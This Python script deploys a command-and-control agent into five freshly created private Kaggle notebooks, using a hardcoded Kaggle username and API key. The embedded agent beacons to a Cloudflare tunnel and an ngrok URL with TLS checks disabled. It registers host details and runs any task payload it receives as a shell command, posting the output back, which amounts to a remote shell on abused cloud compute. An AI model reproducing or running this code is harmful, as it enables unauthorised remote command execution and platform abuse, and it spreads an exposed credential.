#!/usr/bin/env python3
"""Create fresh Kaggle kernels and deploy C2 agent."""
import os, sys, json, time, socket, tempfile, subprocess
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import sqlite3
def get_config(key):
    conn = sqlite3.connect(Path(__file__).resolve().parent.parent / "data" / "c2.db")
    row = conn.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
    conn.close()
    return row[0] if row else ""

C2_URL = get_config("public_url_kaggle") or get_config("public_url")
C2_URL = C2_URL.rstrip("/")
USERNAME = "stephenhowell94611"
API_KEY  = "9a5d3c51ece5433f3072809bc4765604"
KAGGLE_BIN = ["/usr/local/bin/python3.12", "/home/kali/.local/bin/kaggle"]
N_KERNELS = 5

from urllib.parse import urlparse
c2_host = urlparse(C2_URL).hostname or ""
try:    c2_ip = socket.gethostbyname(c2_host)
except: c2_ip = ""

CF_URL = "https://votes-estimated-champion-aspects.trycloudflare.com"
NGROK_URL = C2_URL

print(f"C2 CF   : {CF_URL}")
print(f"C2 NGROK: {NGROK_URL}")

AGENT_CODE = r'''import os,sys,json,time,socket,platform,subprocess,hashlib,threading,ssl
import urllib3; urllib3.disable_warnings()
try: import requests
except: requests=None
URLS=["__C2_URL_CF__","__C2_URL_NGROK__"]
KERNEL_SLUG="__KERNEL_SLUG__"
AGENT_ID=hashlib.sha256(("kaggle:"+KERNEL_SLUG).encode()).hexdigest()[:16]
HDRS={"Content-Type":"application/json","User-Agent":"python-requests/2.28","ngrok-skip-browser-warning":"1"}
print(f"[C2] agent={AGENT_ID} slug={KERNEL_SLUG}",flush=True)
for _u in URLS:
    try:
        _r=requests.get(_u+"/health",timeout=8,verify=False,headers=HDRS) if requests else None
        print(f"[diag] {_u}/health -> {_r.status_code if _r else 'no requests'}",flush=True)
    except Exception as _e:
        print(f"[diag] {_u}: {_e}",flush=True)
def _post(path,data):
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    for url in URLS:
        for attempt in range(2):
            try:
                if requests:
                    r=requests.post(url.rstrip("/")+path,json=data,timeout=25,verify=False,headers=HDRS)
                    print(f"[C2] {url}{path} -> {r.status_code}",flush=True)
                    if r.ok:return r.json()
                else:
                    from urllib.request import Request,urlopen,HTTPSHandler,build_opener
                    opener=build_opener(HTTPSHandler(context=ctx))
                    body=json.dumps(data).encode()
                    req=Request(url.rstrip("/")+path,data=body,headers=HDRS)
                    return json.loads(opener.open(req,timeout=25).read())
            except Exception as e:
                print(f"[C2] {url} attempt {attempt+1}: {e}",flush=True)
                time.sleep(2)
    return {"tasks":[]}
def register():
    info={"id":AGENT_ID,"hostname":"kaggle-"+KERNEL_SLUG.replace("/","-"),"username":os.popen("whoami").read().strip(),"os":"Kaggle "+platform.system(),"arch":platform.machine(),"ip_internal":socket.gethostname(),"platform_type":"kaggle"}
    r=_post("/api/agent/register",info)
    print(f"[C2] register: {r}",flush=True)
def beacon():
    while True:
        try:
            r=_post("/api/agent/beacon",{"id":AGENT_ID})
            for t in r.get("tasks",[]):
                out=subprocess.check_output(t.get("payload",""),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
                _post("/api/agent/result",{"task_id":t["id"],"result":out[:65000]})
        except:pass
        time.sleep(5)
register()
threading.Thread(target=beacon,daemon=True).start()
print("[C2] beacon started",flush=True)
while True:time.sleep(60)
'''

def clean_env():
    e = os.environ.copy()
    e.pop("PYTHONPATH", None)
    return e

def setup_kaggle_creds():
    kd = Path.home() / ".kaggle"
    kd.mkdir(parents=True, exist_ok=True)
    creds = kd / "kaggle.json"
    creds.write_text(json.dumps({"username": USERNAME, "key": API_KEY}))
    creds.chmod(0o600)

def create_and_deploy(slug, idx):
    kernel_name = slug.split("/")[-1]
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        # Create fresh notebook
        nb = {
            "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}, "language_info": {"name": "python", "version": "3.10.0"}},
            "nbformat": 4, "nbformat_minor": 4,
            "cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                       "source": [line + "\n" for line in AGENT_CODE
                           .replace("__C2_URL_CF__", CF_URL)
                           .replace("__C2_URL_NGROK__", NGROK_URL)
                           .replace("__KERNEL_SLUG__", slug)
                           .split("\n")]}]
        }
        nb_path = tmp / f"{kernel_name}.ipynb"
        nb_path.write_text(json.dumps(nb, indent=2))
        meta = {
            "id": slug,
            "title": kernel_name,
            "code_file": nb_path.name,
            "language": "python",
            "kernel_type": "notebook",
            "is_private": True,
            "enable_gpu": False,
            "enable_tpu": False,
            "enable_internet": True,
            "dataset_sources": [],
            "competition_sources": [],
            "kernel_sources": [],
            "model_sources": []
        }
        (tmp / "kernel-metadata.json").write_text(json.dumps(meta, indent=2))
        r = subprocess.run(KAGGLE_BIN + ["kernels", "push", "-p", tmpdir],
                           capture_output=True, text=True, timeout=120, env=clean_env())
        if r.returncode == 0:
            return True
        print(f"  ERR: {(r.stderr or r.stdout).strip()[:200]}")
        return False

setup_kaggle_creds()
print(f"\nCreating {N_KERNELS} fresh kernels...\n")

new_slugs = []
for i in range(1, N_KERNELS + 1):
    slug = f"{USERNAME}/c2-agent-{i}"
    print(f"[{i}/{N_KERNELS}] {slug}...", end=" ", flush=True)
    ok = create_and_deploy(slug, i)
    if ok:
        new_slugs.append(slug)
        print("OK")
    else:
        print("FAIL")
    time.sleep(2)

print(f"\nDone: {len(new_slugs)}/{N_KERNELS} created")

# Update accounts.json with new machines
accounts_path = Path(__file__).resolve().parent.parent / "data" / "accounts.json"
if accounts_path.exists():
    accounts = json.loads(accounts_path.read_text())
    for a in accounts:
        if a.get("kaggle_username") == USERNAME:
            a["machines"] = [{"success": True, "slug": s, "url": f"https://www.kaggle.com/code/{s}"} for s in new_slugs]
            a["machines_created"] = len(new_slugs)
    accounts_path.write_text(json.dumps(accounts, indent=2))
    print("accounts.json updated")
